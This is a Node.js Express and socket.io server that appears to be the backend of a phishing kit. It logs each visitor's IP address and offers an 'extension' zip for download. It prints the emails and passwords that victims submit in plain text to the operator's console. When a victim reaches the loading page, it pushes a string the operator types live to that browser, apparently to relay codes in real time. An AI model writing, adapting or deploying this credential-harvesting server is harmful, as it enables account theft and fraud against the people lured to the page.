const express = require('express');
const socketIo = require('socket.io');
const http = require('http');
const path = require('path');
const readline = require('readline');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});


// ==========================
// 🔧 HELPER FUNCTIONS
// ==========================

// Format IP into IPv4 + IPv6
function formatIP(rawIP) {
  if (!rawIP) return { ipv4: "Unknown", ipv6: "Unknown" };

  // Handle IPv6 mapped IPv4 (::ffff:127.0.0.1)
  if (rawIP.startsWith("::ffff:")) {
    return {
      ipv4: rawIP.replace("::ffff:", ""),
      ipv6: rawIP
    };
  }

  // Pure IPv6
  if (rawIP.includes(":")) {
    return { ipv4: "N/A", ipv6: rawIP };
  }

  // Pure IPv4
  return { ipv4: rawIP, ipv6: "N/A" };
}

// Clean timestamp
function getTime() {
  return new Date().toLocaleTimeString();
}

// Pretty terminal log
function logEvent(type, ipInfo, extra = "") {
  const time = getTime();

  console.log(
    `\x1b[90m[${time}]\x1b[0m ` +                 // gray time
    `\x1b[36m[${type}]\x1b[0m ` +                 // cyan event
    `\x1b[33mIPv4:\x1b[0m ${ipInfo.ipv4} ` +      // yellow label
    `\x1b[35mIPv6:\x1b[0m ${ipInfo.ipv6} ` +      // magenta label
    (extra ? `\x1b[32m→ ${extra}\x1b[0m` : "")    // green arrow text
  );
}


// ==========================
// 🌐 MIDDLEWARE (HTTP)
// ==========================

app.use((req, res, next) => {
  const rawIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ipInfo = formatIP(rawIP);

  logEvent("VISIT", ipInfo, req.url);
  next();
});

// Serve static files
app.use(express.static(__dirname));

// Download route
app.get('/download-extension', (req, res) => {
  const filePath = path.join(__dirname, 'extention.zip');
  if (fs.existsSync(filePath)) {
    res.download(filePath);
  } else {
    res.status(404).send('Extension not found.');
  }
});

app.get('/index.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/loading-screen.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'loading-screen.html'));
});


// ==========================
// 🔌 SOCKET.IO
// ==========================

io.on('connection', (socket) => {
  const rawIP = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  const ipInfo = formatIP(rawIP);

  logEvent("CONNECT", ipInfo);

  socket.on('login', (data) => {
    const { email, password } = data;

    logEvent("LOGIN", ipInfo);

    if (email) {
      console.log(`   \x1b[32m📧 Email:\x1b[0m ${email}`);
    }

    if (password) {
      console.log(`   \x1b[32m🔑 Password:\x1b[0m ${password}`);
    }
  });

  socket.on('loadingPageVisited', () => {
    rl.question("\x1b[34mEnter a string to send to the client:\x1b[0m ", (userInput) => {
      console.log(`\x1b[32mSending input:\x1b[0m ${userInput}`);
      socket.emit('serverInput', userInput);
    });
  });

  socket.on('disconnect', () => {
    logEvent("DISCONNECT", ipInfo);
  });
});


// ==========================
// 🚀 START SERVER
// ==========================

const PORT = 3000;
server.listen(PORT, () => {
  console.log(`\x1b[92mServer is running at http://localhost:${PORT}\x1b[0m`);
});
